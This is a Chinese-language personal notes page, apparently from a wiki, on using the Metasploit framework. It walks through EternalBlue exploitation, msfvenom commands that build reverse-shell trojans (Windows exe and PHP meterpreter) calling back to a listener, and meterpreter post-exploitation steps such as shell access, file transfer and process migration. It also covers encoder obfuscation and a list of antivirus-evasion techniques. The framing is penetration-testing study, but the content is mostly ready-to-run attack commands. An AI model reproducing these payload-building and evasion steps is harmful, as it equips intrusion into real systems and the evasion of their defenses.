---
title: 19.msf
description: msf渗透框架
published: 1
date: 2023-04-21T05:12:23.806Z
tags: web safe, msf
editor: markdown
dateCreated: 2023-04-19T17:46:07.123Z
---

<center>msf</center>



[toc]



## Msf

> metasploit 渗透测试框架 [msf](https://github.com/rapid7/metasploit-framework)
>
> pro功能强大



### 1.使用

```shell
# docker
docker pull metasploitframework/metasploit-framework
docker run -it -p 443:433 d4
# msfconsole
msfconsole

# 查看能使用的漏洞
show exploits

# 搜索
search xxx

# 使用 有规律的
use exploit/windows/smb/ms17_010_eternalblue

# 攻击载荷
show payloads

# 攻击信息
show options
set payload <name>
set lhost <host>
set rhost <host>

# 攻击
exploit/run

# 信息
show info
show tagets
# 检查 不能直接打死别人
check
```

> [msf17010](https://www.codenong.com/cs106870256/)

### 2.木马工具

> msfvenom 木马生成工具

```shell
# 生成木马 -p pyloads -LHOST 主机 -LPORT -f 文件类型
msfvenom -p windows/x64/vncinject/reverse_winhttp LHOST=192.168.1.13 LPORT=888 -f exe > ~/Desktop/shell.exe 


# msfconsole 使用木马监听模块
use exploit/multi/handler
set LHOST 192.168.1.13 
set LPORT 888

# 生成php木马  raw 源码    elf linux格式
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.13 LPORT=888 -f raw > shell.php

# 查看payload
msfvenom -l payload

# 查看代码混淆 -e
msfvenom -l encoders
# 生成文件格式 -f
msfvenom --list format
```



### 3. 会话

> meterpreter 管理木马 
>
> 逆向工具[csdn](https://blog.csdn.net/qq_20031585/article/details/125865535) 
>
> [ghidra](https://github.com/NationalSecurityAgency/ghidra)

```shell
help #帮助文档

# 使用 msf17_010永恒之蓝攻击win7

# 上传下载  那大文件这么办呢
upload/download

# 获取shell  乱码：chcp 65001
shell

# 搜索/编辑 文件
search/edit

# 端口转发
portfwd 

# 进程迁移 我们的木马进程注入到系统进程中
migrate

```



### 4. 木马混淆

> encoders 木马混淆

```shell
# 混淆代码 -e
msfvenom -l encoders 

msfvenom -p windows/x64/vncinject/reverse_winhttp -e x64/zutto_dekiru  LHOST=192.168.1.13 LPORT=888 -f exe  > ~/Desktop/shell.exe
```

>  如何免杀：防止杀软杀了我们
>
>  我们木马混淆就是免杀

```shell
# 一般二进制选手看杀软为何杀我们(了解工作流)
修改文件md5
    1. 添加无效数据(了解pe结构)
    2. 修改资源表
    3. 修改字符串
    4. 修改体积
修改指令(代码)
修改执行流程(加壳)
修改源码
```



### 5.流程

1. 找目标存在的漏洞
2. 使用该漏洞
3. 设置payload
4. 攻击













